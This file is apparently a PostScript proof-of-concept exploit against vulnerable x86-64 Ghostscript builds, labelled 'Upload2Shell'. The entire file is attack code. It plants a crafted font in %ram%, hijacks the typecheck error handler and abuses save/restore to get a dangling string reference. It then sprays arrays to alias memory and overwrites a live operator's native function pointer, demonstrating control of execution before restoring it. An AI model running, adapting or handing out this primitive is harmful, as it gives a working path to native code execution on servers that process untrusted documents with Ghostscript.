%!PS
% Upload2Shell bounded native-memory proof for vulnerable x86-64 Ghostscript builds.
% It swaps one live operator's C function pointer, executes it, and restores it.

true setglobal
/FontPath (%ram%alternate-font.pfa) def
false setglobal
/FontFile FontPath (w) file def
FontFile (%!PS-AdobeFont-1.0: AlternateFace 1.0
/FontType 1 def
/Base /Courier findfont def
/Font Base maxlength dict def
Base { 1 index /FID ne { Font 3 1 roll put } { pop pop } ifelse } forall
Font /FontName /AlternateFace put
/AlternateFace Font definefont pop
userdict /OldGlobal currentglobal put false setglobal
userdict /BadOperand 0 array put
count array astore userdict exch /SavedStack exch put
0 1 userdict /SavedStack get length 1 sub {
  userdict /I-value 3 -1 roll put
  userdict /SavedStack get userdict /I-value get
  2 copy get type /stringtype eq
    { userdict /BadOperand get put } { pop pop } ifelse
} for
userdict /Trap true put
userdict /OldGlobal get setglobal
userdict /SavedStack get aload pop
) writestring
FontFile closefile

/OldTypecheck errordict /typecheck get def
errordict /typecheck {
  userdict /Trap known { userdict /Trap get } { false } ifelse
  { userdict /Trap false put pop pop pop pop pop
    userdict /TargetDict get userdict /TargetKey get userdict /TargetValue get
  } { OldTypecheck } ifelse
} bind put

true setglobal
/FontEntry 1 array def
FontEntry 0 FontPath put
Fontmap /AlternateFace FontEntry readonly put
false setglobal

/Marker 305419896 def             % 0x12345678
/Changed 305419897 def            % 0x12345679
/Victims 512 array def
/TargetDict systemdict def
/TargetKey /GHOSTESCAPE_DANGLING def
/Snapshot save def
/TargetValue 2048 string def
0 1 2047 { TargetValue exch 65 put } for
{ /AlternateFace findfont pop } stopped pop
Snapshot restore

0 1 511 {
  /I-value exch def
  32 array dup 0 1 31 { Marker put dup } for pop
  Victims I-value 3 -1 roll put
} for

/Dangling-value systemdict /GHOSTESCAPE_DANGLING get def
/Offset-value -1 def
8 1 2044 {
  /I-value exch def
  Dangling-value I-value get 16#78 eq
  Dangling-value I-value 1 add get 16#56 eq and
  Dangling-value I-value 2 add get 16#34 eq and
  Dangling-value I-value 3 add get 16#12 eq and
  { /Offset-value I-value def exit } if
} for
Offset-value -1 eq { (NO_OVERLAP\n) print quit } if
Dangling-value Offset-value 16#79 put

/ArrayIndex-value -1 def /Slot-value -1 def
0 1 511 {
  /I-value exch def
  0 1 31 {
    /J exch def
    Victims I-value get J get Changed eq
    { /ArrayIndex-value I-value def /Slot-value J def exit } if
  } for
  ArrayIndex-value -1 ne { exit } if
} for
ArrayIndex-value -1 eq { (NO_ALIAS\n) print quit } if

/RefBase-value Offset-value 8 sub def
/Original-value 16 string def /SubPointer-value 8 string def
Victims ArrayIndex-value get Slot-value /mul load put
0 1 15 { /I-value exch def Original-value I-value Dangling-value RefBase-value I-value add get put } for
(BEFORE=) print 29 11 Victims ArrayIndex-value get Slot-value get exec ==

Victims ArrayIndex-value get Slot-value /sub load put
0 1 7 { /I-value exch def SubPointer-value I-value Dangling-value RefBase-value 8 add I-value add get put } for
Victims ArrayIndex-value get Slot-value /mul load put
0 1 7 {
  /I-value exch def
  Dangling-value RefBase-value 8 add I-value add SubPointer-value I-value get put
} for
(HIJACKED=) print 29 11 Victims ArrayIndex-value get Slot-value get exec ==

0 1 15 { /I-value exch def Dangling-value RefBase-value I-value add Original-value I-value get put } for
(RESTORED=) print 29 11 Victims ArrayIndex-value get Slot-value get exec ==
quit
